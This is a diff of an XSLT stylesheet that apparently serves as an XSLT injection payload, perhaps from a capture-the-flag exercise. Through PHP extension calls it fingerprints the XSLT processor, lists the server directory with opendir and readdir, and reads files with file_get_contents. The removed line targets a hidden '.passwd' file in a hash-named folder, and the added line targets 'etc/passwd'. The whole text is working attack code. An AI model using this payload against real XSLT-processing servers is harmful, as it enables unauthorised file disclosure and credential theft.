@@ -4,16 +4,14 @@
         <span style="font-weight:bold"><xsl:value-of select="name"/> - </span>
     <p>
     	Version: <xsl:value-of select="system-property('xsl:version')" />
-        
+        <br/>
     	Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
-        
+        <br/>
     	Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
-        
+        <br/>
         Dir: <xsl:value-of name="assert" select="php:function('opendir', '.')"/>
-            
+        <br/>
         Files: 
-            
-        <xsl:value-of select="php:function('readdir')"/>
         <br/>
         <xsl:value-of select="php:function('readdir')"/>
         <br/>
@@ -45,7 +43,11 @@
         <br/>
         <xsl:value-of select="php:function('readdir')"/>
         <br/>
-        <xsl:value-of select="php:function('file_get_contents','.6ff3200bee785801f420fba826ffcdee/.passwd')" />
+        <xsl:value-of select="php:function('readdir')"/>
+        <br/>
+        <xsl:value-of select="php:function('file_get_contents','etc/passwd')" />
+        <br/>
+
         
     
 
